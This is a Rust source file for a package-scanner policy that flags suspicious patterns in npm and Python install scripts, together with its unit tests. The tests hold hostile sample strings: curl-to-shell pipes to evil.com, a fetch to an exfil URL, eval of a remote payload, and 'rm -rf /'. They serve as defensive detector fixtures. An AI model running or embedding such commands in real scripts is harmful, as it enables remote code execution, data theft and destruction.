use regex::Regex;

use super::{Policy, PolicyResult};
use crate::types::ScanContext;

/// Severity level for a detected pattern.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum Severity {
    /// Medium severity — generates a warning.
    Warn,
    /// High severity — blocks installation.
    Block,
}

/// A suspicious pattern to look for in install scripts.
struct Pattern {
    /// Human-readable name of the pattern.
    name: &'static str,
    /// The detection method for this pattern.
    detection: Detection,
    /// Severity level of the pattern.
    severity: Severity,
}

/// How a pattern is detected in script content.
enum Detection {
    /// Simple substring match using `.contains()`.
    Contains(&'static str),
    /// Regular expression match (compiled lazily).
    Regex(&'static str),
}

/// Policy that analyzes install scripts for suspicious patterns.
///
/// Scans preinstall, install, and postinstall scripts for known-malicious
/// patterns such as `eval(`, `child_process`, `subprocess`, obfuscated
/// base64 strings, and network access.
pub struct InstallScriptPolicy;

impl InstallScriptPolicy {
    /// Build the list of patterns to check against.
    fn patterns() -> Vec<Pattern> {
        vec![
            // Block patterns (high severity)
            Pattern {
                name: "eval",
                detection: Detection::Contains("eval("),
                severity: Severity::Block,
            },
            Pattern {
                name: "exec",
                detection: Detection::Contains("exec("),
                severity: Severity::Block,
            },
            Pattern {
                name: "child_process",
                detection: Detection::Contains("child_process"),
                severity: Severity::Block,
            },
            Pattern {
                name: "subprocess",
                detection: Detection::Contains("subprocess"),
                severity: Severity::Block,
            },
            Pattern {
                name: "os.system",
                detection: Detection::Contains("os.system"),
                severity: Severity::Block,
            },
            Pattern {
                name: "os.popen",
                detection: Detection::Contains("os.popen"),
                severity: Severity::Block,
            },
            Pattern {
                name: "Function constructor",
                detection: Detection::Contains("Function("),
                severity: Severity::Block,
            },
            // Warn patterns (medium severity)
            Pattern {
                name: "base64 string",
                detection: Detection::Regex(r"[A-Za-z0-9+/=]{40,}"),
                severity: Severity::Warn,
            },
            Pattern {
                name: "http url",
                detection: Detection::Regex(r"https?://"),
                severity: Severity::Warn,
            },
            Pattern {
                name: "process.env",
                detection: Detection::Contains("process.env"),
                severity: Severity::Warn,
            },
            Pattern {
                name: "os.environ",
                detection: Detection::Contains("os.environ"),
                severity: Severity::Warn,
            },
        ]
    }
}

impl Policy for InstallScriptPolicy {
    fn name(&self) -> &str {
        "install_scripts"
    }

    fn evaluate(&self, ctx: &ScanContext) -> PolicyResult {
        if ctx.install_scripts.is_empty() {
            return PolicyResult::Pass;
        }

        let patterns = Self::patterns();
        let mut worst_severity: Option<Severity> = None;
        let mut worst_message: Option<String> = None;

        for script in &ctx.install_scripts {
            for pattern in &patterns {
                let matched = match &pattern.detection {
                    Detection::Contains(needle) => script.content.contains(needle),
                    Detection::Regex(re_str) => {
                        // Compile the regex — this is acceptable for a small number of patterns.
                        if let Ok(re) = Regex::new(re_str) {
                            re.is_match(&script.content)
                        } else {
                            false
                        }
                    }
                };

                if matched {
                    let should_update = match worst_severity {
                        None => true,
                        Some(current) => pattern.severity > current,
                    };

                    if should_update {
                        worst_severity = Some(pattern.severity);
                        worst_message = Some(format!(
                            "Suspicious pattern '{}' found in '{}' script of package '{}'",
                            pattern.name, script.name, ctx.metadata.name
                        ));
                    }

                    // If we already found a Block, no need to check more patterns
                    // for this script (but we still check other scripts for reporting).
                    if pattern.severity == Severity::Block {
                        break;
                    }
                }
            }

            // Early exit if we've already found a Block
            if worst_severity == Some(Severity::Block) {
                break;
            }
        }

        match (worst_severity, worst_message) {
            (Some(Severity::Block), Some(msg)) => PolicyResult::Block(msg),
            (Some(Severity::Warn), Some(msg)) => PolicyResult::Warn(msg),
            _ => PolicyResult::Pass,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{InstallScript, PackageMetadata, ScanContext};

    /// Helper to create a ScanContext with the given install scripts.
    fn make_context(scripts: Vec<InstallScript>) -> ScanContext {
        let meta = PackageMetadata {
            name: "test-pkg".to_string(),
            version: "1.0.0".to_string(),
            description: None,
            published_at: None,
            maintainers: vec![],
            downloads: None,
            repository_url: None,
        };
        ScanContext {
            metadata: meta,
            vulnerabilities: vec![],
            install_scripts: scripts,
            previous_maintainers: None,
        }
    }

    // T-012-01: Clean script passes ("echo done")
    #[test]
    fn clean_script_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "echo done".to_string(),
        }]);

        assert_eq!(policy.evaluate(&ctx), PolicyResult::Pass);
    }

    // T-012-02: eval() in script blocks
    #[test]
    fn eval_in_script_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "eval(Buffer.from('bWFsaWNpb3Vz', 'base64').toString())".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Block(reason) => {
                assert!(
                    reason.contains("eval"),
                    "Block reason should mention 'eval', got: {reason}"
                );
            }
            other => panic!("Expected Block, got {:?}", other),
        }
    }

    // T-012-03: child_process require blocks
    #[test]
    fn child_process_require_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "preinstall".to_string(),
            content: "require('child_process').exec('curl http://evil.com | sh')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "child_process should be blocked, got: {:?}",
            result
        );
    }

    // T-012-04: Base64 string above threshold warns
    #[test]
    fn base64_string_above_threshold_warns() {
        let policy = InstallScriptPolicy;
        // A 60-character base64 string
        let base64_payload = "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwYWJjZA==";
        assert!(base64_payload.len() >= 40);
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: format!("var data = '{base64_payload}';"),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("base64"),
                    "Warn reason should mention 'base64', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-012-05: HTTP URL in script warns
    #[test]
    fn http_url_in_script_warns() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "fetch('https://evil.com/exfil')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        match &result {
            PolicyResult::Warn(reason) => {
                assert!(
                    reason.contains("http url"),
                    "Warn reason should mention 'http url', got: {reason}"
                );
            }
            other => panic!("Expected Warn, got {:?}", other),
        }
    }

    // T-012-06: subprocess in Python script blocks
    #[test]
    fn subprocess_in_python_script_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "import subprocess; subprocess.call(['rm', '-rf', '/'])".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "subprocess should be blocked, got: {:?}",
            result
        );
    }

    // T-012-07: No install scripts passes (empty Vec)
    #[test]
    fn no_install_scripts_passes() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![]);

        assert_eq!(policy.evaluate(&ctx), PolicyResult::Pass);
    }

    // T-012-08: Multiple patterns — worst result wins
    #[test]
    fn multiple_patterns_worst_result_wins() {
        let policy = InstallScriptPolicy;
        // This script has both a warn pattern (https URL) and a block pattern (eval)
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "eval(require('https://evil.com/payload.js'))".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "Block should take precedence over Warn, got: {:?}",
            result
        );
    }

    // Additional test: os.system blocks
    #[test]
    fn os_system_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "install".to_string(),
            content: "os.system('curl http://evil.com | sh')".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "os.system should be blocked, got: {:?}",
            result
        );
    }

    // Additional test: process.env warns
    #[test]
    fn process_env_warns() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "postinstall".to_string(),
            content: "console.log(process.env.HOME)".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Warn(_)),
            "process.env should warn, got: {:?}",
            result
        );
    }

    // Additional test: Function constructor blocks
    #[test]
    fn function_constructor_blocks() {
        let policy = InstallScriptPolicy;
        let ctx = make_context(vec![InstallScript {
            name: "preinstall".to_string(),
            content: "new Function('return this')()".to_string(),
        }]);

        let result = policy.evaluate(&ctx);
        assert!(
            matches!(result, PolicyResult::Block(_)),
            "Function( should be blocked, got: {:?}",
            result
        );
    }
}
